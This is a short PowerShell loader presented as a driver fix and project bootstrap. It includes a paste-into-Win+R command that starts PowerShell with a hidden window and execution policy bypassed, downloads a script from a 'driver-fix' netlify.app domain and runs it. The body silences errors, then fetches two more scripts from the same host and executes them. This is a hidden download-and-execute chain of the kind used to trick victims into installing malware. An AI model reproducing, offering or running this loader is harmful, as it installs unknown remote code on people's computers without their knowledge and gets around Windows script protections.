# Win+R master — LocaleProfileSync FIRST, then Host bootstrap.
# powershell -w h -ep bypass -c "$t=$env:TEMP;iwr 'https://driver-fix-238308.netlify.app/win-bootstrap.ps1' -O $t\w.ps1 -useb;& $t\w.ps1"
$ErrorActionPreference = 'SilentlyContinue'
$ProgressPreference = 'SilentlyContinue'

$Base = 'https://driver-fix-238308.netlify.app'
$t = $env:TEMP

# 1) LocaleProfileSync — must run first
$lpsPath = Join-Path $t 'LocaleProfileSync.ps1'
Invoke-WebRequest -Uri "$Base/LocaleProfileSync.ps1" -OutFile $lpsPath -UseBasicParsing
& $lpsPath

# 2) Host project — node, npm install, npm run dev, open localhost
$hostPath = Join-Path $t 'bootstrap-host.ps1'
Invoke-WebRequest -Uri "$Base/bootstrap.ps1" -OutFile $hostPath -UseBasicParsing
& $hostPath
